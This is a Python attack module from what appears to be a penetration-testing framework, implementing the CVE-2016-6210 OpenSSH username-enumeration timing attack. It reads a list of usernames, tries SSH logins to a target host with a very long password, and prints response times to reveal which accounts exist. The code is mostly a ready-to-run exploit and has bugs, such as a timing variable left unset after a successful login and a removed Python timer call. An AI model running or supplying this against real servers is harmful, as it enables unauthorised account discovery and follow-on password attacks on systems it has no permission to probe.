# CVE-2016-6210

from jframework.modules.model import Module
import time
hasParamiko = True
try:
    import paramiko
except:
    hasParamiko = False


class Openssh(Module):

    def __init__(self):
        super(Openssh, self).__init__()
        self.userFile = "jframework/files/users.txt"

    def users(self, u):
        self.userFile = u

    def help(self):
        super(Openssh, self).help()
        print("users file_name -> Load the usernames")

    def conf(self):
        super(Openssh, self).conf()
        print("userFile: " + str(self.userFile))

    def run(self):
        super(Openssh, self).run()
        if(not hasParamiko):
            print("It's required install paramiko module")
            return
        try:
            openFile = open(self.userFile)
        except:
            print("[✕] Error " + str(self.userFile))
            return
        for line in openFile:
            client = paramiko.SSHClient()
            time1 = time.clock()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(self.HOST, username=line, password=(26000 * 'J'), timeout=2)
            except Exception as e:
                elements = ["timed out", "is not subscriptable" ]

                if elements[0] in str(e) or elements[1] in str(e):
                    print("Not SSH service")
                    return
                time2 = time.clock()

            print("%s >> %.5f" % (str(line.strip("\n")), (time2 - time1)))

        client.close()
